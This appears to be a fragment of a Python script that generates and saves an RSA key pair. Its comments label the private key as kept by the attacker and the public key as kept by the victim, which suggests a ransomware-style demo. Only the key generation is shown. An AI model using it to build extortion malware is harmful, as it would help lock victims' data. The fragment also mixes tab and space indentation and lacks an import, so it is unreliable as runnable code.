"""
Generate Public and Private Key
"""
def generate():
	"""
	Generate Private and Public Key 
	"""
	# Files
    attacker_key_file="private-key.bin"
    receiver_key_file="public-key.bin"

    """
    Using RSA class to generate public and private key pair
    :: Steps
    1. Generate a public and private key pair for RSA
    """
    # Public & Private Keys
    key = RSA.generate(2048) # Generate Public and Private Key Pair for RSA of size 2048-bits
    private_key = key.export_key()  # Get Private Key from Key Pair
    
    # Open key file to write the private key (kept by attacker)
    with open(attacker_key_file, "wb") as write_key: 
        write_key.write(private_key)
        write_key.close()

    public_key = key.publickey().export_key()   # Get Public Key from Key Pair

    # Open key file to write the public key (kept by victim)
    with open(receiver_key_file, "wb") as write_key:
        write_key.write(public_key)
        write_key.close()
    


